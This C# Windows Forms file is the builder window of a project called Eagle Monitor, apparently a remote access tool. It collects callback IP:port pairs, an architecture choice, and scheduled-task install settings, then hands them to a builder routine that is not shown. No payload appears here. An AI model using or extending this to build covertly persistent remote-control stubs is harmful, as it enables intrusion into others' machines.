﻿using Eagle_Monitor.Controls;
using Microsoft.VisualBasic;
using System;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor.Forms
{
    public partial class BuilderForm : FormPattern
    {
        public BuilderForm()
        {
            InitializeComponent();
        }

        private void BuilderForm_Load(object sender, EventArgs e)
        {

        }

        private void windowsButton1_Click(object sender, EventArgs e)
        {
            StringBuilder S = new StringBuilder();
            foreach (ListViewItem I in hostsListView.Items) 
            {
                S.Append(I.Text + ":" + I.SubItems[1].Text + "|-|");
            
            }
            Helpers.BuilderHelper B = new Helpers.BuilderHelper();
            if (taskNameTextBox.Enabled == false)
                taskNameTextBox.Text = "";
            B.Build(bits64CheckBox.Checked, S.ToString(), taskNameTextBox.Text, timeTextBox.Text);
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string host = Interaction.InputBox("IP:");
            string port = Interaction.InputBox("Port:");
            ListViewItem I = new ListViewItem(host);
            I.SubItems.Add(port);
            hostsListView.Items.Add(I);
        }
        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem I in hostsListView.SelectedItems)
                I.Remove();
        }

        private void installCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (installCheckBox.Checked)
            {
                taskNameTextBox.Enabled = true;
                taskNameTextBox.BackColor = Color.FromArgb(250, 250, 250);
                timeTextBox.Enabled = true;
                timeTextBox.BackColor = Color.FromArgb(250, 250, 250);
            }
            else 
            {
                taskNameTextBox.Enabled = false;
                taskNameTextBox.BackColor = Color.FromArgb(230, 230, 230);
                taskNameTextBox.Text = "";
                timeTextBox.Enabled = false;
                timeTextBox.BackColor = Color.FromArgb(230, 230, 230);
            }
        }
    }
}
